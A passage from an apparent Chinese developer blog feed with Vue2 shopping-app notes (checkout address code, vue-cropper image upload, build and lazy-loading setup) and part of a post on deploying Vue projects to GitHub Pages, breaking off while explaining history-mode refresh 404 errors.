defaultIndex)</span><br><span class="line">          if (Number(defaultIndex) !== -1) {</span><br><span class="line">            // 找到后将数组数据转对象赋值给chosenAddress属性</span><br><span class="line">            this.chosenAddress = this.addressList[defaultIndex];</span><br><span class="line"></span><br><span class="line">            // 处理地址Code转为Name</span><br><span class="line">            const regionId = String(this.chosenAddress.region_id);</span><br><span class="line">            // 调用 getFullAddressInfo 方法</span><br><span class="line">            this.regionName = await this.fetchFullAddressName(regionId);</span><br><span class="line">          } else {</span><br><span class="line">            console.log("未找到有效的默认地址索引");</span><br><span class="line">          }</span><br><span class="line">        } else {</span><br><span class="line">          // Vuex没有默认地址，则默认选中第一个地址</span><br><span class="line">          // 设置chosenAddress属性为addressList的第一个地址</span><br><span class="line">          this.chosenAddress = this.addressList[0];</span><br><span class="line">          const regionId = String(this.chosenAddress.region_id);</span><br><span class="line">          this.regionName = await this.fetchFullAddressName(regionId);</span><br><span class="line">          console.log(</span><br><span class="line">            "无默认地址，展示数据chosenAddress：",</span><br><span class="line">            this.chosenAddress</span><br><span class="line">          );</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  },</span><br><span class="line">  data() {</span><br><span class="line">    return {</span><br><span class="line">      addressList: [], // 地址列表</span><br><span class="line">      chosenAddress: {}, // 被选择进行展示的地址</span><br><span class="line">      regionName: {}, // 将地址Code转为Name</span><br><span class="line">      cartList: [], // 购物车列表</span><br><span class="line">    };</span><br><span class="line">  },</span><br><span class="line">  computed: {</span><br><span class="line">    getadsid() {</span><br><span class="line">      return this.$route.query.adsid;</span><br><span class="line">    },</span><br><span class="line">  },</span><br><span class="line">  methods: {</span><br><span class="line">    ...mapActions("Address", ["getAddressList", "getAddressDetail"]),</span><br><span class="line">    ...mapGetters("Address", ["getDefaultAddressId"]),</span><br><span class="line">    ...mapActions("AddressMap", ["buildReverseMaps", "fetchFullAddressName"]),</span><br><span class="line">    ...mapActions("Cart", ["getCartAction"]),</span><br><span class="line">    ...mapGetters("Cart", [</span><br><span class="line">      "selectedCartList",</span><br><span class="line">      "selectedCartCount",</span><br><span class="line">      "selectedPrice",</span><br><span class="line">    ]),</span><br><span class="line">  },</span><br><span class="line">};</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang="less" scoped&gt;</span><br><span class="line">.pay {</span><br><span class="line">  padding-top: 46px;</span><br><span class="line">  padding-bottom: 46px;</span><br><span class="line">  ::v-deep {</span><br><span class="line">    .van-nav-bar__arrow {</span><br><span class="line">      color: #333;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line">.address {</span><br><span class="line">  display: flex;</span><br><span class="line">  align-items: center;</span><br><span class="line">  justify-content: flex-start;</span><br><span class="line">  padding: 20px;</span><br><span class="line">  font-size: 14px;</span><br><span class="line">  color: #666;</span><br><span class="line">  position: relative;</span><br><span class="line">  background: url(@/assets/border-line.png) bottom repeat-x;</span><br><span class="line">  background-size: 60px auto;</span><br><span class="line">  .left-icon {</span><br><span class="line">    margin-right: 20px;</span><br><span class="line">  }</span><br><span class="line">  .right-icon {</span><br><span class="line">    position: absolute;</span><br><span class="line">    right: 20px;</span><br><span class="line">    top: 50%;</span><br><span class="line">    transform: translateY(-7px);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line">.goods-item {</span><br><span class="line">  height: 100px;</span><br><span class="line">  margin-bottom: 6px;</span><br><span class="line">  padding: 10px;</span><br><span class="line">  background-color: #fff;</span><br><span class="line">  display: flex;</span><br><span class="line">  .left {</span><br><span class="line">    width: 100px;</span><br><span class="line">    img {</span><br><span class="line">      display: block;</span><br><span class="line">      width: 80px;</span><br><span class="line">      margin: 10px auto;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  .right {</span><br><span class="line">    flex: 1;</span><br><span class="line">    font-size: 14px;</span><br><span class="line">    line-height: 1.3;</span><br><span class="line">    padding: 10px;</span><br><span class="line">    padding-right: 0px;</span><br><span class="line">    display: flex;</span><br><span class="line">    flex-direction: column;</span><br><span class="line">    justify-content: space-evenly;</span><br><span class="line">    color: #333;</span><br><span class="line">    .info {</span><br><span class="line">      margin-top: 5px;</span><br><span class="line">      display: flex;</span><br><span class="line">      justify-content: space-between;</span><br><span class="line">      .price {</span><br><span class="line">        color: #fa2209;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">.flow-num-box {</span><br><span class="line">  display: flex;</span><br><span class="line">  justify-content: flex-end;</span><br><span class="line">  padding: 10px 10px;</span><br><span class="line">  font-size: 14px;</span><br><span class="line">  border-bottom: 1px solid #efefef;</span><br><span class="line">  .money {</span><br><span class="line">    color: #fa2209;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">.pay-cell {</span><br><span class="line">  font-size: 14px;</span><br><span class="line">  padding: 10px 12px;</span><br><span class="line">  color: #333;</span><br><span class="line">  display: flex;</span><br><span class="line">  justify-content: space-between;</span><br><span class="line">  .red {</span><br><span class="line">    color: #fa2209;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line">.pay-detail {</span><br><span class="line">  border-bottom: 1px solid #efefef;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">.pay-way {</span><br><span class="line">  font-size: 14px;</span><br><span class="line">  padding: 10px 12px;</span><br><span class="line">  border-bottom: 1px solid #efefef;</span><br><span class="line">  color: #333;</span><br><span class="line">  .tit {</span><br><span class="line">    line-height: 30px;</span><br><span class="line">  }</span><br><span class="line">  .pay-cell {</span><br><span class="line">    padding: 10px 0;</span><br><span class="line">  }</span><br><span class="line">  .van-icon {</span><br><span class="line">    font-size: 20px;</span><br><span class="line">    margin-right: 5px;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">.buytips {</span><br><span class="line">  display: block;</span><br><span class="line">  textarea {</span><br><span class="line">    display: block;</span><br><span class="line">    width: 100%;</span><br><span class="line">    border: none;</span><br><span class="line">    font-size: 14px;</span><br><span class="line">    padding: 12px;</span><br><span class="line">    height: 100px;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">.footer-fixed {</span><br><span class="line">  position: fixed;</span><br><span class="line">  background-color: #fff;</span><br><span class="line">  left: 0;</span><br><span class="line">  bottom: 0;</span><br><span class="line">  width: 100%;</span><br><span class="line">  height: 46px;</span><br><span class="line">  line-height: 46px;</span><br><span class="line">  border-top: 1px solid #efefef;</span><br><span class="line">  font-size: 14px;</span><br><span class="line">  display: flex;</span><br><span class="line">  .left {</span><br><span class="line">    flex: 1;</span><br><span class="line">    padding-left: 12px;</span><br><span class="line">    color: #666;</span><br><span class="line">    span {</span><br><span class="line">      color: #fa2209;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  .tipsbtn {</span><br><span class="line">    width: 121px;</span><br><span class="line">    background: linear-gradient(90deg, #f9211c, #ff6335);</span><br><span class="line">    color: #fff;</span><br><span class="line">    text-align: center;</span><br><span class="line">    line-height: 46px;</span><br><span class="line">    display: block;</span><br><span class="line">    font-size: 14px;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></tbody></table></figure><h2 id="订单结算"><a class="markdownIt-Anchor" href="#订单结算"></a> 订单结算</h2><p>购物车携带参数：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202409020134925.png" alt="image-20240902013448659"></p><h2 id="文件上传unfinished"><a class="markdownIt-Anchor" href="#文件上传unfinished"></a> 文件上传 ——unfinished</h2><h3 id="图片上传"><a class="markdownIt-Anchor" href="#图片上传"></a> 图片上传</h3><blockquote><p>接口要求：POST <code>/upload/image</code></p><p>Header 参数：</p><ul><li>Access-Token (String) 示例：<code>1741f74aed758a688515f72572dc8e37</code></li><li>platform (String) 示例值：H5</li></ul><p>Body 参数：<code>multipart/form-data</code></p><ul><li>file 对象</li></ul></blockquote><p>上传图片通常涉及到裁剪操作，于是使用 vue-cropper 插件辅助完成。</p><h4 id="安装-vue-cropper"><a class="markdownIt-Anchor" href="#安装-vue-cropper"></a> 安装 vue-cropper</h4><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install vue-cropper --save</span><br></pre></td></tr></tbody></table></figure><h4 id="在组件中使用-vue-cropper"><a class="markdownIt-Anchor" href="#在组件中使用-vue-cropper"></a> 在组件中使用 <code>vue-cropper</code></h4><p>创建上传的组件，允许用户选择图片、裁剪图片并实时预览裁剪效果，然后上传裁剪后的图片。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class="avatar-upload"&gt;</span><br><span class="line">    &lt;vue-cropper</span><br><span class="line">      v-if="showCropper"</span><br><span class="line">      ref="cropper"</span><br><span class="line">      :img="imageSrc"</span><br><span class="line">      :output-size="{ width: 200, height: 200 }"</span><br><span class="line">      :output-type="'jpeg'"</span><br><span class="line">      :can-move-box="true"</span><br><span class="line">      :auto-crop="true"</span><br><span class="line">      :fixed-box="true"</span><br><span class="line">      :fixed="true"</span><br><span class="line">      :center-box="true"</span><br><span class="line">    &gt;&lt;/vue-cropper&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div v-else&gt;</span><br><span class="line">      &lt;img</span><br><span class="line">        :src="avatarUrl"</span><br><span class="line">        alt="Avatar"</span><br><span class="line">        v-if="avatarUrl"</span><br><span class="line">        class="avatar-preview"</span><br><span class="line">      /&gt;</span><br><span class="line">      &lt;input type="file" @change="onAvatarChange" /&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div v-if="showCropper" class="cropper-controls"&gt;</span><br><span class="line">      &lt;button @click="cropImage"&gt;裁剪并上传&lt;/button&gt;</span><br><span class="line">      &lt;button @click="cancelCrop"&gt;取消&lt;/button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import VueCropper from "vue-cropper";</span><br><span class="line">import { uploadImage } from "@/api/upload";</span><br><span class="line"></span><br><span class="line">export default {</span><br><span class="line">  components: {</span><br><span class="line">    VueCropper,</span><br><span class="line">  },</span><br><span class="line">  data() {</span><br><span class="line">    return {</span><br><span class="line">      avatarUrl: "", // 存储裁剪后的头像URL</span><br><span class="line">      imageSrc: "", // 存储用户选择的图片的URL</span><br><span class="line">      showCropper: false, // 控制是否显示裁剪器</span><br><span class="line">    };</span><br><span class="line">  },</span><br><span class="line">  methods: {</span><br><span class="line">    onAvatarChange(event) {</span><br><span class="line">      const file = event.target.files[0];</span><br><span class="line">      if (file) {</span><br><span class="line">        this.imageSrc = URL.createObjectURL(file);</span><br><span class="line">        this.showCropper = true;</span><br><span class="line">      }</span><br><span class="line">    },</span><br><span class="line">    async cropImage() {</span><br><span class="line">      // 获取裁剪后的图片数据</span><br><span class="line">      this.$refs.cropper.getCropBlob(async (blob) =&gt; {</span><br><span class="line">        // 上传裁剪后的图片</span><br><span class="line">        try {</span><br><span class="line">          const formData = new FormData();</span><br><span class="line">          formData.append("file", blob);</span><br><span class="line">          const response = await uploadImage(blob);</span><br><span class="line">          if (response.status === 200) {</span><br><span class="line">            this.avatarUrl = response.data.fileInfo.preview_url;</span><br><span class="line">            this.showCropper = false;</span><br><span class="line">          } else {</span><br><span class="line">            this.$toast.fail("上传失败，请重试");</span><br><span class="line">          }</span><br><span class="line">        } catch (error) {</span><br><span class="line">          this.$toast.fail("上传失败，请重试");</span><br><span class="line">          console.error(error);</span><br><span class="line">        }</span><br><span class="line">      });</span><br><span class="line">    },</span><br><span class="line">    cancelCrop() {</span><br><span class="line">      this.showCropper = false;</span><br><span class="line">      this.imageSrc = "";</span><br><span class="line">    },</span><br><span class="line">  },</span><br><span class="line">};</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">.avatar-upload {</span><br><span class="line">  display: flex;</span><br><span class="line">  flex-direction: column;</span><br><span class="line">  align-items: center;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">.avatar-preview {</span><br><span class="line">  width: 200px;</span><br><span class="line">  height: 200px;</span><br><span class="line">  border-radius: 50%;</span><br><span class="line">  object-fit: cover;</span><br><span class="line">  margin-bottom: 10px;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">.cropper-controls {</span><br><span class="line">  margin-top: 10px;</span><br><span class="line">  display: flex;</span><br><span class="line">  gap: 10px;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">.cropper-controls button {</span><br><span class="line">  padding: 5px 10px;</span><br><span class="line">  background-color: #ff3e47;</span><br><span class="line">  color: white;</span><br><span class="line">  border: none;</span><br><span class="line">  border-radius: 5px;</span><br><span class="line">  cursor: pointer;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">.cropper-controls button:hover {</span><br><span class="line">  background-color: #e0363d;</span><br><span class="line">}</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></tbody></table></figure><h2 id="打包优化"><a class="markdownIt-Anchor" href="#打包优化"></a> 打包优化</h2><h3 id="优化访问路径"><a class="markdownIt-Anchor" href="#优化访问路径"></a> 优化访问路径</h3><p>打包命令：<code>yarn build</code> 或者 <code>npm run build</code></p><p>打包如果没有配置 vue.config.js 的 <code>publicPath</code>，默认生成的匹配文件的写法是绝对路径，这意味着将来的可移植性降低。于是配置：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> { defineConfig } = <span class="built_in">require</span>(<span class="string">"@vue/cli-service"</span>);</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="title function_">defineConfig</span>({</span><br><span class="line">  <span class="attr">publicPath</span>: <span class="string">"./"</span>, <span class="comment">// 默认为'/'</span></span><br><span class="line">  <span class="attr">transpileDependencies</span>: <span class="literal">true</span>,</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><h3 id="懒加载"><a class="markdownIt-Anchor" href="#懒加载"></a> 懒加载</h3><p>打包实际上将多个文件多合一，如果一次性加载所有的 js 文件是非常消耗性能的，因此推荐配置懒加载。</p><p><a href="https://router.vuejs.org/zh/guide/advanced/lazy-loading.html">路由懒加载</a></p><ul><li>异步组件改造 </li></ul><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">ProDetail</span> = (<span class="params"></span>) =&gt; <span class="keyword">import</span>(<span class="string">'@/views/prodetail'</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">Pay</span> = (<span class="params"></span>) =&gt; <span class="keyword">import</span>(<span class="string">'@/views/pay'</span>)</span><br><span class="line">...</span><br></pre></td></tr></tbody></table></figure><ul><li>路由中应用 </li></ul><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>({</span><br><span class="line">  <span class="attr">routes</span>: [</span><br><span class="line">    ...</span><br><span class="line">    {<span class="attr">path</span>:<span class="string">'prodetail/:id'</span>, <span class="attr">component</span>: <span class="title class_">ProDetail</span>},</span><br><span class="line">    {<span class="title class_">Path</span>:<span class="string">'/Pay'</span>, <span class="attr">component</span>: <span class="title class_">Pay</span>},</span><br><span class="line">    ...</span><br><span class="line">  ]</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure><p>对比：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202409030451734.png" alt="image-20240903045130463"></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue 项目打包并部署到 GitHub 为 demo</title>
      <link href="/posts/31657.html"/>
      <url>/posts/31657.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><blockquote><p>目标：将打包好的 Vue2 | Vue3 项目部署到 <a href="https://docs.github.com/zh/pages/getting-started-with-github-pages/about-github-pages">github pages</a> 用作项目 demo</p></blockquote><p>我将尽可能的讲述打包前后可能遇到的绝大部分问题和原因，希望能有所帮助。</p><h2 id="打包前的问题"><a class="markdownIt-Anchor" href="#打包前的问题"></a> 打包前的问题</h2><p>打包其实实际上不会碰到什么大问题，我们讨论的问题实际是打包之后想要将打包结果也就是静态页面进行部署而发生的问题：</p><ol><li>白屏问题</li><li>刷新 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status">404</a> 问题</li><li>跨域问题</li></ol><p>但要想讨论上述问题，我们得研究好打包前的配置问题，也就是为什么会出现上述问题？</p><h3 id="请求地址配置问题"><a class="markdownIt-Anchor" href="#请求地址配置问题"></a> 请求地址配置问题</h3><p>首先我这里默认你的项目中二次封装了 <code>axios</code> 并配置了 <code>base</code> 请求基地址（别告诉我请求地址是 localhost 哈），那么你的请求配置方法可能是：</p><ol><li>主动暴露 base</li></ol><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">base</span>: <span class="string">'http://your.domain.com'</span></span><br><span class="line"><span class="attr">api</span>: <span class="string">'/api/end-point'</span></span><br><span class="line"></span><br><span class="line"># <span class="title class_">The</span> final request form may look <span class="attr">like</span>:</span><br><span class="line"><span class="attr">http</span>:<span class="comment">//your.domain.com/api/end-point</span></span><br></pre></td></tr></tbody></table></figure><p>或者你是这样配置的（环境为 Vue3+vite）：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">base</span>: <span class="keyword">import</span>.<span class="property">meta</span>.<span class="property">env</span>.<span class="property">VITE_BASE_URL</span></span><br><span class="line"><span class="attr">api</span>: <span class="string">'/api/end-point'</span></span><br><span class="line"></span><br><span class="line"># <span class="title class_">The</span> final request form may look <span class="attr">like</span>:</span><br><span class="line"><span class="attr">http</span>:<span class="comment">//your.domain.com/api/end-point</span></span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>配置 proxy 转发</li></ol><p>如果你并没有在二次封装 axios 的过程中暴露具体请求地址，而是配置了 proxy 进行代理转发，你的 proxy 配置可能是：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># vite.<span class="property">config</span>.<span class="property">js</span></span><br><span class="line"><span class="attr">devServer</span>: {</span><br><span class="line">  <span class="attr">proxy</span>: {</span><br><span class="line">    <span class="string">'/dev'</span>: {</span><br><span class="line">      <span class="attr">target</span>: <span class="string">'http://your.domain.com'</span>,</span><br><span class="line">      <span class="attr">pathRewrite</span>: { <span class="string">'^/dev'</span>: <span class="string">''</span> }</span><br><span class="line">      ......</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>配置 proxy 的开发环境下，只要请求匹配到 <code>/api</code> 就会把请求转发到 <code>target</code> 并且将 <code>/dev</code> 删除，浏览器请求为（假设你的项目运行在 8088 端口）：<code>http://localhost:8088/dev/api/end-point</code>，实际请求为：<code>http://your.domain.com/api/end-point</code></p><h3 id="proxy-的缺点"><a class="markdownIt-Anchor" href="#proxy-的缺点"></a> proxy 的缺点</h3><p>这两者在开发环境进行请求都没有问题，都能完成任务，但是一旦进行了打包，脚手架环境消失，这第 2 种配置方法就失效了，请求会只剩下 <code>/dev/api/end-point</code> 这种形式。</p><p>可能你会问：玩呢？这怎么发请求，我明明还是见到浏览器发出请求了啊，只不过失败了。</p><p>是的，<code>/dev/api/end-point</code> 这种形式的确不能正常发请求，不过浏览器会在只给出如 <code>/dev/api/end-point</code> 的形式的请求时，自动在前面拼接上下文环境，比如在本地测试项目，浏览器就会自动拼接上 <code>http://localhost:8088</code> 使得最终形式为：<code>http://localhost:8088/dev/api/end-point</code>。不过变成这种情况的话，基本也就无法部署了（本地部署除外），因为你已经失去了脚手架的 proxy 环境，不过你依然可以在 Vue 项目的同系统环境下使用 Nginx（类似 Nginx 的也行）尝试进行监听和转发，也就是反向代理。详情请见下节中的 <a href="#history%E4%BD%BF%E7%94%A8">history 使用</a>。</p><p>那么第 1 种配置方法会在打包之后发生什么问题吗？不会，它可以正常工作（除非请求地址是 localhost，如果为 localhost 则会引起跨域问题）。</p><h3 id="js-引入地址配置问题"><a class="markdownIt-Anchor" href="#js-引入地址配置问题"></a> Js 引入地址配置问题</h3><p>如果说请求地址影响着数据显示问题，那么 js 引入地址影响的是打包后的页面白屏问题。</p><p>这个问题基本上就是打包后的文件引入问题，我们应当将导出后的 js 等文件的引入地址配置为相对地址。</p><p>在 vite 或 vue-cli 中 <a id="js">应当配置</a> 如下：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># vite.<span class="property">config</span>.<span class="property">js</span></span><br><span class="line"><span class="attr">base</span>: <span class="string">'./'</span>,</span><br></pre></td></tr></tbody></table></figure><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># vue.<span class="property">config</span>.<span class="property">js</span></span><br><span class="line"><span class="attr">publicPath</span>: <span class="string">'./'</span>,</span><br></pre></td></tr></tbody></table></figure><blockquote><p>对于 vue2 的 vue-cli，官方文档中不推荐直接配置 <code>output.publicPath</code> 而是始终使用 **<code>publicPath</code>**</p></blockquote><p>这将使得打包后的 <code>index.html</code> 页面的 js 引入地址为相对地址，看起来就像这样：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"css/app.363852d2.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> /&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>请注意结果为 <code>css/app.363852d2.css</code> 而非 <code>/js/app.5bd045ab.js</code></p><h2 id="解决打包后的白屏问题"><a class="markdownIt-Anchor" href="#解决打包后的白屏问题"></a> 解决打包后的白屏问题</h2><p>出现白屏问题，白屏分为：</p><ol><li>跨域造成的</li><li> js 未正确引入造成的：没有配置成相对路径，详见 <a href="#js">js 配置</a></li><li>其他……</li></ol><h3 id="解决跨域问题"><a class="markdownIt-Anchor" href="#解决跨域问题"></a> 解决跨域问题</h3><blockquote><p>相关链接：<a href="https://cloud.tencent.com/developer/article/1953193">什么是跨域问题？</a></p></blockquote><p>其实也谈不上解决，毕竟这个问题不是真正的跨域问题，<strong>真正的跨域问题只靠前端不靠服务器是不可能解决的</strong>。</p><p>一般这种情况下的跨域问题主要是打包后的文件是以 file 协议进行读取的，而 file 协议不像 http (s) 协议支持跨域，所以控制台 CROS 跨域报错</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410102158577.png" alt="image-20241010215831443"></p><p>解决方案参考：<a href="https://blog.csdn.net/qq_34727886/article/details/136163494">vite 打包本地文件，file 类型 URL 引发跨域等问题探讨</a></p><p>但我不太推荐上面的解决方案，因为利用 Nginx（或其他网络服务器）的反向代理就够了。</p><p>详情见 <a href="#history">history 使用</a></p><h3 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h3><p>诚然，我不可能见过所有的白屏问题，所以欢迎探讨。</p><h2 id="解决打包后的刷新-404-问题"><a class="markdownIt-Anchor" href="#解决打包后的刷新-404-问题"></a> 解决打包后的刷新 404 问题</h2><p>为什么会出现有基本结构但是我刷新就报 404 错误呢？</p><p>这个问题的发生满足以下条件：</p><ol><li><p>配置了默认访问或 <code>/</code> 访问重定向到某具体路由页面，如 <code>/home</code></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Vue2</span></span><br><span class="line"><span class="attr">path</span>: <span class="string">'/'</span>,</span><br><span class="line"><span class="attr">redirect</span>: <span class="string">'/home'</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment">// Vue3</span></span><br><span class="line"><span class="attr">path</span>: <span class="string">'/'</span>,</span><br><span class="line"><span class="attr">redirect</span>: <span class="string">'/article/manage'</span>,</span><br></pre></td></tr></tbody></table></figure></li><li><p>配置了路由模式为不带<code>#</code>符号的 <code>history</code> 历史模式</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Vue2</span></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>({</span><br><span class="line">  <span class="attr">mode</span>: <span class="string">'history'</span>,</span><br><span class="line">  routes</span><br><span class="line">})</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br><span class="line"></span><br><span class="line"><span class="comment">// Vue3</span></span><br><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>({</span><br><span class="line">  <span class="comment">// history: createWebHashHistory()</span></span><br><span class="line">  <span class="attr">history</span>: <span class="title function_">createWebHistory</span>(),</span><br><span class="line">  routes</span><br><span class="line">})</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></tbody></table></figure></li></ol><p>为什么说满足以上条件就会触发这个问题呢？</p><p>这是因为当你第一次访问项目，你的访问地址可能是：<code>http://localhost:8088</code> 或者 <code>http://localhost:8088/</code> 